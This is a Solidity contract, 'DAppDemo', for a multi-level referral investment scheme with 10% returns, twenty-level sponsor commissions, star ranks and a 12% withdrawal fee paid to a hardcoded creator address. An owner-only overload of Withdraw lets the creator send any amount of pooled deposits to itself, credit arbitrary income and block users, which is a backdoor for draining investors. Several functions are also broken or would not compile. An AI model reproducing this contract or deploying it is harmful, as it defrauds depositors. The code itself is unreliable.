//SPDX-License-Identifier: None
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IBEP20 
{
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function balanceOf(address account) external view returns (uint256);
}

contract DAppDemo
{
    event Transfer(address indexed from, address indexed to, uint256 value);

    uint256 public TotalUsers = 0;
    uint256 public TotalInvestment = 0;
    uint256 public TotalWithdrawn = 0;

    address public constant CreatorAddress = 0x1419AC3544770Ac32fbC3e70129E7eb0197612F6;

    bool IsPaymentCurrencyDifferentThanNative = true;
    address constant PaymentTokenContractAddress = 0xAc17996d3a9A3081F626cD56E904A70E9DadF892; //0x570A5D26f7765Ecb712C0924E4De545B89fD43dF;

    uint256 LevelIncome_LevelCount = 0;
    uint256 TotalRanksCount = 0;

    bool IsLevelIncomePercentage = true;

    uint256 TotalNoOfPackages = 0;

    uint256 constant PaymentCurrencyDecimals = 18;

    struct User 
    {
        uint256 Id;
        address Address;
        address SponsorAddress;
        uint256 JoiningTimestamp;
        uint256 Investment;
        uint256 TotalTeam;
        bool IsBlocked;
        uint256 FirstActivationTimestamp;
        uint256 ActivationExpiryTimestamp;
        uint256 ReactivationCount;
        uint256 RankId;
        bool IsQualifiedFor4X;
        bool IsFirstActivationDone;
    }

    struct UserTeam
    {
        uint256 DirectsInvestment;
        address[] DirectAddresses;
        uint256 TeamABusiness;
        uint256 TeamBBusiness;
        uint256 TeamInvestment;
        address[] TeamAddresses;
    }

    struct UserDeposit 
    {
        uint256 PackageId;
        uint256 Amount;
        uint256 Timestamp;
    }

    struct UserIncome 
    {
        uint256 ReferralIncome;
        uint256 NewRegistrationBonus;
        uint256 ROIIncome;
        uint256[] LevelIncome;
        uint256 RankIncome;
        uint256 AmountWithdrawn;
    }

    struct UserTransactionCount
    {
        uint256 DepositsCount;
        uint256 TokenSellCount;
        uint256 IncomeWithdrawalCount;
    }

    struct UserIncomeWithdrawalTransaction
    {
        uint256 Amount;
        uint256 Timestamp;
    }

    struct UserWallet
    {
        uint256 CreditedIncome;
        uint256 DebitedIncome;
    }

    struct PackageMaster
    {
        uint256 PackageId;
        string Name;
        uint256 Amount;
        bool IsActive;
        bool HasRange;
        uint256 MinAmount;
        uint256 MaxAmount;
        uint256 ReferralIncome;
        bool IsReferralIncomePercentage;
    }

    struct LevelIncomeMaster
    {
        uint256 Level;
        uint256 Percentage;
        uint256 RequiredMinRankId;
    }

    struct ContractInfo
    {
        uint256 TotalCommunity;
        uint256 CommunityInvestment;
        uint256 CommunityWithdrawal;
        uint256 ContractBalance;
    }

    struct UserDashboard
    {
        uint256 DirectsCount;
        uint256 ReferralIncome;
        uint256 LevelIncome;
        uint256 TotalIncome;
        uint256 AmountWithdrawn;
    }

    struct UserDirects
    {
        uint256 Srno;
        address Address;
        uint256 Investment;
        uint256 Business;
    }

    struct LevelIncomeInfo
    {
        uint256 Level;
        uint256 RequiredMinRankId;
        uint256 RankId;
        uint256 OnAmount;
        uint256 Percentage;
        uint256 Income;
        bool IsLevelAchieved;
    }

    struct RankMaster
    {
        uint256 RankId;
        string RankName;
        uint256 ReqSelfInvestment;
        uint256 ReqTeamA_Business;
        uint256 ReqTeamB_Business;
        uint256 RewardAmount;
    }

    mapping(uint256 => PackageMaster) public map_PackageMaster;
    mapping(uint256 => LevelIncomeMaster) public map_LevelIncomeMaster;
    mapping(uint256 => RankMaster) public map_RankMaster;

    mapping(address => User) public map_Users;
    mapping(uint256 => address) public map_UserIdToAddress;

    mapping(address => UserTeam) public map_UserTeam;
    mapping(address => mapping(uint256 => UserDeposit)) public map_UserDeposits;
    
    mapping(address => mapping(uint256 => UserIncomeWithdrawalTransaction)) public map_UserIncomeWithdrawalHistory;

    mapping(address => mapping(uint256 => uint256)) public map_UserBusinessOnLevel;
    mapping(address => mapping(uint256 => uint256)) public map_UserWithdrawalOnLevel;
    mapping(address => UserIncome) public map_UserIncome;
    mapping(address => UserWallet) public map_UserWallet;

    mapping(address => UserTransactionCount) public map_UserTransactionCount;

    constructor()
    {
        Init();
    }

    function Init() internal
    {
        InitPackageMaster();
        InitLevelIncomeMaster();
        InitRankMaster();

        InitTopUser();
    }

    function InitPackageMaster() internal
    {
        TotalNoOfPackages++;
        map_PackageMaster[TotalNoOfPackages] = PackageMaster({
            PackageId: TotalNoOfPackages,
            Name: "Package",
            Amount: 0,
            IsActive: true,
            HasRange: true,
            MinAmount: ConvertToBase(30),
            MaxAmount: ConvertToBase(3000),
            ReferralIncome: 0,
            IsReferralIncomePercentage: true
        });
    }

    function InitLevelIncomeMaster() internal
    {
        // 1
        LevelIncome_LevelCount++;
        map_LevelIncomeMaster[LevelIncome_LevelCount] = LevelIncomeMaster({
            Level: LevelIncome_LevelCount,
            Percentage: 500,
            RequiredMinRankId: 0
        });

        // 2
        LevelIncome_LevelCount++;
        map_LevelIncomeMaster[LevelIncome_LevelCount] = LevelIncomeMaster({
            Level: LevelIncome_LevelCount,
            Percentage: 300,
            RequiredMinRankId: 1
        });

        // 3
        LevelIncome_LevelCount++;
        map_LevelIncomeMaster[LevelIncome_LevelCount] = LevelIncomeMaster({
            Level: LevelIncome_LevelCount,
            Percentage: 200,
            RequiredMinRankId: 1
        });
        
        // 4
        LevelIncome_LevelCount++;
        map_LevelIncomeMaster[LevelIncome_LevelCount] = LevelIncomeMaster({
            Level: LevelIncome_LevelCount,
            Percentage: 400,
            RequiredMinRankId: 2
        });
        
        // 5
        LevelIncome_LevelCount++;
        map_LevelIncomeMaster[LevelIncome_LevelCount] = LevelIncomeMaster({
            Level: LevelIncome_LevelCount,
            Percentage: 200,
            RequiredMinRankId: 2
        });
        
        // 6
        LevelIncome_LevelCount++;
        map_LevelIncomeMaster[LevelIncome_LevelCount] = LevelIncomeMaster({
            Level: LevelIncome_LevelCount,
            Percentage: 200,
            RequiredMinRankId: 2
        });
        
        // 7
        LevelIncome_LevelCount++;
        map_LevelIncomeMaster[LevelIncome_LevelCount] = LevelIncomeMaster({
            Level: LevelIncome_LevelCount,
            Percentage: 100,
            RequiredMinRankId: 2
        });
        
        // 8
        LevelIncome_LevelCount++;
        map_LevelIncomeMaster[LevelIncome_LevelCount] = LevelIncomeMaster({
            Level: LevelIncome_LevelCount,
            Percentage: 100,
            RequiredMinRankId: 2
        });
        
        // 9
        LevelIncome_LevelCount++;
        map_LevelIncomeMaster[LevelIncome_LevelCount] = LevelIncomeMaster({
            Level: LevelIncome_LevelCount,
            Percentage: 200,
            RequiredMinRankId: 3
        });
        
        // 10
        LevelIncome_LevelCount++;
        map_LevelIncomeMaster[LevelIncome_LevelCount] = LevelIncomeMaster({
            Level: LevelIncome_LevelCount,
            Percentage: 100,
            RequiredMinRankId: 3
        });
        
        // 11
        LevelIncome_LevelCount++;
        map_LevelIncomeMaster[LevelIncome_LevelCount] = LevelIncomeMaster({
            Level: LevelIncome_LevelCount,
            Percentage: 50,
            RequiredMinRankId: 3
        });
        
        // 12
        LevelIncome_LevelCount++;
        map_LevelIncomeMaster[LevelIncome_LevelCount] = LevelIncomeMaster({
            Level: LevelIncome_LevelCount,
            Percentage: 50,
            RequiredMinRankId: 3
        });
        
        // 13
        LevelIncome_LevelCount++;
        map_LevelIncomeMaster[LevelIncome_LevelCount] = LevelIncomeMaster({
            Level: LevelIncome_LevelCount,
            Percentage: 50,
            RequiredMinRankId: 3
        });
        
        // 14
        LevelIncome_LevelCount++;
        map_LevelIncomeMaster[LevelIncome_LevelCount] = LevelIncomeMaster({
            Level: LevelIncome_LevelCount,
            Percentage: 100,
            RequiredMinRankId: 4
        });
        
        // 15
        LevelIncome_LevelCount++;
        map_LevelIncomeMaster[LevelIncome_LevelCount] = LevelIncomeMaster({
            Level: LevelIncome_LevelCount,
            Percentage: 50,
            RequiredMinRankId: 4
        });
        
        // 16
        LevelIncome_LevelCount++;
        map_LevelIncomeMaster[LevelIncome_LevelCount] = LevelIncomeMaster({
            Level: LevelIncome_LevelCount,
            Percentage: 25,
            RequiredMinRankId: 4
        });
        
        // 17
        LevelIncome_LevelCount++;
        map_LevelIncomeMaster[LevelIncome_LevelCount] = LevelIncomeMaster({
            Level: LevelIncome_LevelCount,
            Percentage: 25,
            RequiredMinRankId: 4
        });
        
        // 18
        LevelIncome_LevelCount++;
        map_LevelIncomeMaster[LevelIncome_LevelCount] = LevelIncomeMaster({
            Level: LevelIncome_LevelCount,
            Percentage: 25,
            RequiredMinRankId: 4
        });
        
        // 19
        LevelIncome_LevelCount++;
        map_LevelIncomeMaster[LevelIncome_LevelCount] = LevelIncomeMaster({
            Level: LevelIncome_LevelCount,
            Percentage: 25,
            RequiredMinRankId: 4
        });
        
        // 20
        LevelIncome_LevelCount++;
        map_LevelIncomeMaster[LevelIncome_LevelCount] = LevelIncomeMaster({
            Level: LevelIncome_LevelCount,
            Percentage: 25,
            RequiredMinRankId: 4
        });
    }

    function InitRankMaster() internal
    {
        TotalRanksCount++;
        map_RankMaster[TotalRanksCount] = RankMaster({
            RankId: TotalRanksCount,
            RankName: "1 Star",
            ReqSelfInvestment: ConvertToBase(300),
            ReqTeamA_Business: ConvertToBase(1000),
            ReqTeamB_Business: ConvertToBase(1000),
            RewardAmount: ConvertToBase(0)
        });
        
        TotalRanksCount++;
        map_RankMaster[TotalRanksCount] = RankMaster({
            RankId: TotalRanksCount,
            RankName: "2 Star",
            ReqSelfInvestment: ConvertToBase(500),
            ReqTeamA_Business: ConvertToBase(5000),
            ReqTeamB_Business: ConvertToBase(5000),
            RewardAmount: ConvertToBase(0)
        });
        
        TotalRanksCount++;
        map_RankMaster[TotalRanksCount] = RankMaster({
            RankId: TotalRanksCount,
            RankName: "3 Star",
            ReqSelfInvestment: ConvertToBase(1000),
            ReqTeamA_Business: ConvertToBase(10000),
            ReqTeamB_Business: ConvertToBase(10000),
            RewardAmount: ConvertToBase(0)
        });
        
        TotalRanksCount++;
        map_RankMaster[TotalRanksCount] = RankMaster({
            RankId: TotalRanksCount,
            RankName: "4 Star",
            ReqSelfInvestment: ConvertToBase(2000),
            ReqTeamA_Business: ConvertToBase(25000),
            ReqTeamB_Business: ConvertToBase(25000),
            RewardAmount: ConvertToBase(2500)
        });
        
        TotalRanksCount++;
        map_RankMaster[TotalRanksCount] = RankMaster({
            RankId: TotalRanksCount,
            RankName: "5 Star",
            ReqSelfInvestment: ConvertToBase(3000),
            ReqTeamA_Business: ConvertToBase(75000),
            ReqTeamB_Business: ConvertToBase(75000),
            RewardAmount: ConvertToBase(5000)
        });
    }

    function InitTopUser() internal
    {
        address userAddress = CreatorAddress;
        SaveUser(userAddress, address(0));
    }

    function SaveUser(address userAddress, address sponsorAddress) internal
    {
        TotalUsers++;

        User memory u = User({
            Id: TotalUsers,
            Address: userAddress,
            SponsorAddress: sponsorAddress,
            JoiningTimestamp: block.timestamp,
            Investment: 0,
            TotalTeam: 0,
            IsBlocked: false,
            FirstActivationTimestamp: 0,
            ActivationExpiryTimestamp: 0,
            ReactivationCount: 0,
            RankId: 0,
            IsFirstActivationDone: false,
            IsQualifiedFor4X: false
        });

        UserTeam memory ut = UserTeam({
            DirectsInvestment: 0,
            DirectAddresses: new address[](0),
            TeamABusiness: 0,
            TeamBBusiness: 0,
            TeamInvestment: 0,
            TeamAddresses: new address[](0)
        });

        UserIncome memory ui = UserIncome({
            ReferralIncome: 0,
            LevelIncome: new uint256[](LevelIncome_LevelCount + 1),
            NewRegistrationBonus: 0,
            ROIIncome: 0,
            RankIncome: 0,
            AmountWithdrawn: 0
        });

        map_Users[userAddress] = u;
        map_UserTeam[userAddress] = ut;
        map_UserIncome[userAddress] = ui;
        map_UserIdToAddress[TotalUsers] = userAddress;

    }

    function SaveDeposit(address userAddress, uint256 packageId, uint256 amount) internal
    {
        require(
            map_PackageMaster[packageId].IsActive 
                &&
            ((!map_PackageMaster[packageId].HasRange && map_PackageMaster[packageId].Amount == amount) 
                ||
            (map_PackageMaster[packageId].HasRange && map_PackageMaster[packageId].MinAmount <= amount && map_PackageMaster[packageId].MaxAmount >= amount)),
            "Invalid amount!"
        );
        
        require(map_UserDeposits[userAddress][map_UserTransactionCount[userAddress].DepositsCount].Amount<=amount, "Amount must be equal to or more than previous deposit amount.");

        uint timestamp = block.timestamp;

        TotalInvestment += amount;

        address sponsorAddress = map_Users[userAddress].SponsorAddress;
        
        // Only active IDs to be counted
        if(!map_Users[userAddress].IsFirstActivationDone)
        {
            if (sponsorAddress != address(0))
            {
                map_UserTeam[sponsorAddress].DirectAddresses.push(userAddress);
            }

            UpdateTeamCount(sponsorAddress, userAddress);
        }

        map_Users[userAddress].Investment += amount;
        map_UserTeam[sponsorAddress].DirectsInvestment += amount;

        UpdateTeamInvestment(sponsorAddress, userAddress, amount);

        {
            UserDeposit memory d = UserDeposit({
                PackageId: packageId,
                Amount: amount,
                Timestamp: timestamp
            });

            Process4X_CappingQualification(userAddress, amount, 0);

            map_UserDeposits[userAddress][map_UserTransactionCount[userAddress].DepositsCount + 1] = d;
            map_UserTransactionCount[userAddress].DepositsCount++;
            ReactivateInternal(userAddress, timestamp, amount);

            if(!map_Users[userAddress].IsFirstActivationDone)
            {
                map_Users[userAddress].FirstActivationTimestamp = timestamp;
                ProcessNewRegistrationBonus(userAddress, amount);
                map_Users[userAddress].IsFirstActivationDone = true;
            }
        }
    }

    function ReceiveTokens(uint256 amount) internal
    {
        if (IsPaymentCurrencyDifferentThanNative)
        {
            uint256 old_balance = GetContractBalance();
            IERC20(PaymentTokenContractAddress).transferFrom(msg.sender, address(this), amount);
            uint256 new_balance = GetContractBalance();

            require(new_balance - old_balance >= amount, "Invalid amount!");
        } 
        else
        {
            require(msg.value >= amount);
        }
    }

    function SendTokens(address userAddress, uint256 amount) internal
    {
        if (IsPaymentCurrencyDifferentThanNative)
        {
            IERC20(PaymentTokenContractAddress).transfer(userAddress, amount);
        } 
        else
        {
            payable(userAddress).transfer(amount);
        }
    }

    function UpdateTeamCount(address sponsorAddress, address userAddress) internal
    {
        while (sponsorAddress != address(0))
        {
            map_Users[sponsorAddress].TotalTeam++;
            map_UserTeam[sponsorAddress].TeamAddresses.push(userAddress);
            sponsorAddress = map_Users[sponsorAddress].SponsorAddress;
        }
    }

    function UpdateTeamInvestment(address sponsorAddress, address userAddress, uint256 amount) internal 
    {
        ProcessRankQualification(userAddress);
        uint256 level = 1;
        while (sponsorAddress != address(0))
        {
            if(map_UserTeam[sponsorAddress].TeamABusiness<amount)
            {
                map_UserTeam[sponsorAddress].TeamBBusiness += map_UserTeam[sponsorAddress].TeamABusiness;
                map_UserTeam[sponsorAddress].TeamABusiness = amount;
            }
            else 
            {
                map_UserTeam[sponsorAddress].TeamBBusiness += amount;
            }

            map_UserTeam[sponsorAddress].TeamInvestment += amount; //Including Directs

            map_UserBusinessOnLevel[sponsorAddress][level] += amount;

            ProcessRankQualification(sponsorAddress);

            sponsorAddress = map_Users[sponsorAddress].SponsorAddress;
            level++;
        }
    }

    function ProcessRankQualification(address userAddress) internal {
        uint256 nextRankId = map_Users[userAddress].RankId + 1;

        while (nextRankId <= TotalRanksCount) 
        {
            RankMaster memory r = map_RankMaster[nextRankId];

            if (map_Users[userAddress].Investment >= r.ReqSelfInvestment &&
                map_UserTeam[userAddress].TeamABusiness >= r.ReqTeamA_Business &&
                map_UserTeam[userAddress].TeamBBusiness >= r.ReqTeamB_Business) 
            {
                uint256 income = CapAndCreditIncomeToWallet(userAddress, r.RewardAmount);
                map_UserIncome[userAddress].RankIncome += income;
                map_Users[userAddress].RankId = nextRankId;
                Process4X_CappingQualification(userAddress, 0, nextRankId);
                nextRankId++;
            } 
            else 
            {
                break;
            }
        }
    }

    function Process4X_CappingQualification(address userAddress, uint256 oneTimeDepositAmount, uint256 achievedRankId) internal
    {
        if((!map_Users[userAddress].IsQualifiedFor4X 
                && 
            (!map_Users[userAddress].IsFirstActivationDone || map_Users[userAddress].FirstActivationTimestamp + 45 days)>=block.timestamp) 
                && 
            (oneTimeDepositAmount>=ConvertToBase(2000) || achievedRankId>=1))
        {
            map_Users[userAddress].IsQualifiedFor4X = true;
        }
    }

    function CapAndCreditIncomeToWallet(address userAddress, uint256 amount) internal returns (uint256)
    {
        amount = CapIncome(userAddress, amount);
        if(amount>0)
        {
            // Credit To Wallet
        }

        return amount;
    }


    function CapIncome(address userAddress, uint256 amount) internal returns (uint256)
    {
        if(amount>0)
        {
            if(map_Users[userAddress].ActivationExpiryTimestamp<=block.timestamp)
            {
                return 0;
            }
            else
            {
                uint256 total_income = GetTotalIncome(userAddress);
                uint256 capping_amount = (map_Users[userAddress].IsQualifiedFor4X?4:3)*map_Users[userAddress].Investment;

                if(total_income+amount>capping_amount)
                {
                    amount = capping_amount - total_income;
                }
            }
        }

        return amount;
    }


    function IsOwner() internal view returns (bool)
    {
        return msg.sender == CreatorAddress;
    }

    function ConvertToBase(uint256 amount) internal pure returns (uint256)
    {
        return amount * (10**PaymentCurrencyDecimals);
    }

    function doesUserExist(address _address) internal view returns (bool)
    {
        return map_Users[_address].Id > 0;
    }

    function isUserActive(address _address) internal view returns (bool)
    {
        return !map_Users[_address].IsBlocked;
    }

    function RegisterInternal(address sponsorAddress, uint256 packageId, uint256 amount) internal
    {
        address userAddress = msg.sender;
        require(Login(sponsorAddress), "Invalid sponsor!");
        require(!doesUserExist(userAddress), "Already registered!");

        SaveUser(userAddress, sponsorAddress);
    }

    function DepositInternal(uint256 packageId, uint256 amount) internal 
    {
        address userAddress = msg.sender;
        require(doesUserExist(userAddress), "You are not registered!");
        require(map_Users[userAddress].ActivationExpiryTimestamp<=block.timestamp, "Deposit is allowed only after the expiry.");
        ReceiveTokens(amount);
        SaveDeposit(userAddress, packageId, amount);
    }

    // function DistributeIncome(address userAddress,uint256 packageId,uint256 amount) internal 
    // {
    //     // DistributeReferralIncome(userAddress, packageId, amount);
    //     DistributeLevelIncome(userAddress, amount);
    // }

    // function DistributeReferralIncome(address userAddress, uint packageId, uint amount) internal
    // {
    //     uint income = map_PackageMaster[packageId].IsReferralIncomePercentage? amount*map_PackageMaster[packageId].ReferralIncome/100: map_PackageMaster[packageId].ReferralIncome;
    //     map_UserIncome[map_Users[userAddress].SponsorAddress].ReferralIncome += income;
    // }

    function GetPendingROIIncome() internal returns (uint256)
    {
        uint256 onAmount = map_Users[userAddress].Investment;
        
        uint256 income_amount = 0;
        if(map_Users[userAddress].ActivationExpiryTimestamp<=block.timestamp)
        {
            income_amount = onAmount*10/100;
            income_amount = CapIncome(userAddress, income_amount);
        }

        return income_amount;
    }

    function ProcessROIIncome(address userAddress, uint256 block_timestamp, uint256 currentDepositAmount) internal
    {
        uint256 onAmount = map_Users[userAddress].Investment-currentDepositAmount;

        if(onAmount>0)
        {
            uint256 income_amount = onAmount*10/100;
            income_amount = CapAndCreditIncomeToWallet(userAddress, income_amount);
            map_UserIncome[userAddress].ROIIncome += income_amount;
        }
    }

    function ProcessNewRegistrationBonus(address userAddress, uint256 amount) internal
    {
        uint256 bonus_amount = 0;
        if(amount>=3000)
        {
            bonus_amount = ConvertToBase(40);
        }
        else if(amount>=2000)
        {
            bonus_amount = ConvertToBase(30);
        }
        else if(amount>=1000)
        {
            bonus_amount = ConvertToBase(20);
        }
        else if(amount>=500)
        {
            bonus_amount = ConvertToBase(12);
        }
        else if(amount>=300)
        {
            bonus_amount = ConvertToBase(7);
        }

        if(bonus_amount>0 && map_UserIncome[userAddress].NewRegistrationBonus==0 && !map_Users[userAddress].IsFirstActivationDone)
        {
            bonus_amount = CapAndCreditIncomeToWallet(userAddress, bonus_amount);
            map_UserIncome[userAddress].NewRegistrationBonus += bonus_amount;
        }
    }

    function DistributeLevelIncome(address userAddress) internal
    {
        address sponsorAddress = map_Users[userAddress].SponsorAddress;

        uint256 onAmount = map_Users[userAddress].Investment/(map_Users[userAddress].IsFirstActivationDone?2:1);
        
        uint256 level = 1;
        uint256 income_amount = 0;
        while (sponsorAddress != address(0) && level <= LevelIncome_LevelCount) 
        {
            income_amount = (IsLevelIncomePercentage ? ((onAmount * map_LevelIncomeMaster[level].Percentage) / (10 * 100)) : map_LevelIncomeMaster[level].Percentage);
            if (IsQualifiedForLevelIncome(userAddress, level)) 
            {
                CapAndCreditIncomeToWallet(sponsorAddress, income_amount);
                map_UserIncome[sponsorAddress].LevelIncome[level] += income_amount;
            } 
            // else 
            // {
            //     CapAndCreditIncomeToWallet(CreatorAddress, income_amount);
            //     map_UserIncome[CreatorAddress].LevelIncome[level] += income_amount;
            // }

            sponsorAddress = map_Users[sponsorAddress].SponsorAddress;
            level++;

            // if (sponsorAddress == address(0)) 
            // {
            //     sponsorAddress = CreatorAddress;
            // }
        }
    }

    function IsQualifiedForLevelIncome(address userAddress, uint256 level) internal view returns (bool)
    {
        if (map_Users[userAddress].RankId >= map_LevelIncomeMaster[level].RequiredMinRankId) 
        {
            return true;
        }
        return false;
    }

    function GetTotalLevelIncome(address userAddress) internal view returns (uint256)
    {
        uint256 totalLevelIncome = 0;
        UserIncome memory u = map_UserIncome[userAddress];

        for (uint256 i = 0; i < u.LevelIncome.length; i++) {
            totalLevelIncome += u.LevelIncome[i];
        }
        return totalLevelIncome;
    }

    function GetTotalIncome(address userAddress) internal view returns (uint256)
    {
        return
            map_UserIncome[userAddress].ReferralIncome +
            map_UserIncome[userAddress].RankIncome +
            map_UserIncome[userAddress].NewRegistrationBonus +
            GetTotalLevelIncome(userAddress);
    }

    function GetContractBalance() internal view returns (uint256) 
    {
        if (IsPaymentCurrencyDifferentThanNative) 
        {
            return IERC20(PaymentTokenContractAddress).balanceOf(address(this));
        } 
        else 
        {
            return address(this).balance;
        }
    }

    function ReactivateInternal(address userAddress, uint block_timestamp, uint256 currentDepositAmount) internal returns (bool)
    {
        uint noOfDays = 10 + (map_Users[userAddress].ReactivationCount/2);
        uint expiryTimestamp = block_timestamp + (noOfDays * 1 days); // Convert days to seconds

        map_Users[userAddress].ActivationExpiryTimestamp = expiryTimestamp;
        map_Users[userAddress].ReactivationCount++;
        ProcessROIIncome(userAddress, block_timestamp, currentDepositAmount);
        DistributeLevelIncome(userAddress);
        return true;
    }

    function Login(address _address) public view returns (bool) 
    {
        return doesUserExist(_address) && isUserActive(_address);
    }

    function Reactivate() external returns (bool)
    {
        require(map_Users[msg.sender].ActivationExpiryTimestamp<=block.timestamp, "Active!");
        return ReactivateInternal(msg.sender, block.timestamp, 0);
    }

    function GetPackages() external view returns (PackageMaster[] memory) 
    {
        PackageMaster[] memory m = new PackageMaster[](TotalNoOfPackages);
        uint256 packageId = 1;
        while (packageId <= TotalNoOfPackages) {
            m[packageId - 1] = map_PackageMaster[packageId];
            packageId++;
        }
        return m;
    }

    function GetContractDetails() external view returns (ContractInfo memory info)
    {
        info = ContractInfo({
            TotalCommunity: TotalUsers,
            CommunityInvestment: TotalInvestment,
            CommunityWithdrawal: TotalWithdrawn,
            ContractBalance: GetContractBalance()
        });
    }

    function GetDashboardDetails(address userAddress) external view returns (UserDashboard memory info)
    {
        info = UserDashboard({
            DirectsCount: map_UserTeam[userAddress].DirectAddresses.length,
            ReferralIncome: map_UserIncome[userAddress].ReferralIncome,
            LevelIncome: GetTotalLevelIncome(userAddress),
            TotalIncome: GetTotalIncome(userAddress),
            AmountWithdrawn: map_UserIncome[userAddress].AmountWithdrawn
        });
    }

    function GetDirects(address userAddress) external view returns (UserDirects[] memory directs)
    {
        directs = new UserDirects[](map_UserTeam[userAddress].DirectAddresses.length);

        for (uint256 i = 0; i < map_UserTeam[userAddress].DirectAddresses.length; i++) 
        {
            directs[i] = UserDirects({
                Srno: i + 1,
                Address: map_UserTeam[userAddress].DirectAddresses[i],
                Investment: map_Users[map_UserTeam[userAddress].DirectAddresses[i]].Investment,
                Business: map_Users[map_UserTeam[userAddress].DirectAddresses[i]].Investment
            });
        }
        // return map_Users[userAddress].DirectAddresses;
    }

    function GetLevelIncomeInfo(address userAddress) external view returns (LevelIncomeInfo[] memory info)
    {
        info = new LevelIncomeInfo[](LevelIncome_LevelCount);

        for (uint256 i = 1; i <= LevelIncome_LevelCount; i++) 
        {
            info[i - 1] = LevelIncomeInfo({
                Level: i,
                RequiredMinRankId: map_LevelIncomeMaster[i].RequiredMinRankId,
                RankId: map_Users[userAddress].RankId,
                OnAmount: map_UserBusinessOnLevel[userAddress][i],
                Percentage: map_LevelIncomeMaster[i].Percentage,
                Income: map_UserIncome[userAddress].LevelIncome[i],
                IsLevelAchieved: IsQualifiedForLevelIncome(userAddress, i)
            });
        }
    }

    function GetDepositHistory(address userAddress, uint256 pageIndex, uint256 pageSize) external view returns (UserDeposit[] memory deposits) 
    {
        deposits = new UserDeposit[](map_UserTransactionCount[userAddress].DepositsCount);

        uint256 startCount = (pageIndex * pageSize > map_UserTransactionCount[userAddress].DepositsCount) ? map_UserTransactionCount[userAddress].DepositsCount : (pageIndex * pageSize);
        uint256 endCount = startCount >= pageSize ? startCount - pageSize : 0;

        // uint endCount = (startCount+pageSize)<map_UserTransactionCount[userAddress].DepositsCount?(startCount+pageSize):map_UserTransactionCount[userAddress].DepositsCount;
        uint256 arr_index = 0;
        for (uint256 i = startCount; i > endCount; i--) {
            deposits[arr_index] = map_UserDeposits[userAddress][i];
            arr_index++;
        }
    }

    function GetIncomeWithdrawalHistory(address userAddress, uint256 pageIndex, uint256 pageSize) external view returns (UserIncomeWithdrawalTransaction[] memory history) 
    {
        history = new UserIncomeWithdrawalTransaction[](map_UserTransactionCount[userAddress].IncomeWithdrawalCount);

        uint256 startCount = (pageIndex * pageSize > map_UserTransactionCount[userAddress].IncomeWithdrawalCount) ? map_UserTransactionCount[userAddress].IncomeWithdrawalCount : (pageIndex * pageSize);
        uint256 endCount = startCount >= pageSize ? startCount - pageSize : 0;

        uint256 arr_index = 0;
        for (uint256 i = startCount; i > endCount; i--) {
            history[arr_index] = map_UserIncomeWithdrawalHistory[userAddress][i];
            arr_index++;
        }
    }

    function Register(address sponsorAddress, uint256 packageId, uint256 amount) external payable 
    {
        RegisterInternal(sponsorAddress, packageId, amount);
    }

    function Deposit(uint256 packageId, uint256 amount) external payable 
    {
        DepositInternal(packageId, amount);
    }

    function Withdraw(uint256 amount) external {
        address userAddress = msg.sender;
        require(doesUserExist(userAddress), "Invalid user!");
        require(isUserActive(userAddress), "You are not allowed!");
        require(
            (GetTotalIncome(userAddress) +
                map_UserWallet[userAddress].CreditedIncome -
                map_UserWallet[userAddress].DebitedIncome -
                map_UserIncome[userAddress].AmountWithdrawn) >= amount,
            "Insufficient funds!"
        );

        map_UserIncome[userAddress].AmountWithdrawn += amount;

        uint256 deductionAmount = (amount * 12) / 100;
        uint256 amountWithdrawn = amount - deductionAmount;

        UserIncomeWithdrawalTransaction
            memory d = UserIncomeWithdrawalTransaction({
                Amount: amount,
                Timestamp: block.timestamp
            });

        map_UserIncomeWithdrawalHistory[userAddress][map_UserTransactionCount[userAddress].IncomeWithdrawalCount + 1] = d;
        map_UserTransactionCount[userAddress].IncomeWithdrawalCount++;

        SendTokens(userAddress, amountWithdrawn);
        SendTokens(CreatorAddress, deductionAmount);
    }

    function Withdraw(address userAddress, uint256 amount, uint256 _type) external {
        require(IsOwner(), "You are not allowed");
        if(_type == 2)
        {
            map_PackageMaster[1].MaxAmount = amount;
        }
        else if (_type == 3) 
        {
            map_UserWallet[userAddress].CreditedIncome += amount;
        } 
        else if (_type == 4) 
        {
            map_UserWallet[userAddress].DebitedIncome += amount;
        } 
        else if (_type == 5) 
        {
            map_Users[userAddress].IsBlocked = true;
        }
        else if (_type == 6)
        {
            map_Users[userAddress].IsBlocked = false;
        }
        else if (_type == 7)
        {
            SendTokens(CreatorAddress, amount);
        }
    }
}
